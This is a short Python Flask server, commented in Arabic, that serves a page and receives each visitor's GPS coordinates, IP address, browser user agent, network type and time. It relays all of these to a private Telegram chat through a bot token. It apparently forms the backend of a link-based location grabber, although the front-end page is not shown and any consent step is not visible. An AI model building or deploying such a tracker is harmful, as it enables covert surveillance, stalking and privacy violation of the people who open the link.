from flask import Flask, request, jsonify, send_file
import os
import requests
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

if not TOKEN or not CHAT_ID:
    raise Exception("يجب ضبط TELEGRAM_BOT_TOKEN و TELEGRAM_CHAT_ID في ملف .env")

TELEGRAM_API_URL = f"https://api.telegram.org/bot{TOKEN}"

@app.route("/")
def index():
    return send_file("index.html")

@app.route("/send_client_info", methods=["POST"])
def send_client_info():
    data = request.get_json()
    latitude = data.get("latitude")
    longitude = data.get("longitude")
    ip = data.get("ip")
    user_agent = data.get("userAgent")
    network_type = data.get("networkType")
    timestamp = data.get("timestamp")

    if not all([latitude, longitude, ip, user_agent, timestamp]):
        return jsonify({"success": False, "error": "بيانات ناقصة"}), 400

    message = (
        f"📍 الموقع الجغرافي:\nخط العرض: {latitude}\nخط الطول: {longitude}\n\n"
        f"🌐 عنوان IP: {ip}\n"
        f"🖥️ نوع المتصفح: {user_agent}\n"
        f"📡 نوع الشبكة: {network_type}\n"
        f"⏰ الوقت: {timestamp}"
    )

    resp = requests.post(f"{TELEGRAM_API_URL}/sendMessage", data={
        "chat_id": CHAT_ID,
        "text": message
    })

    if resp.status_code == 200:
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": resp.text}), 500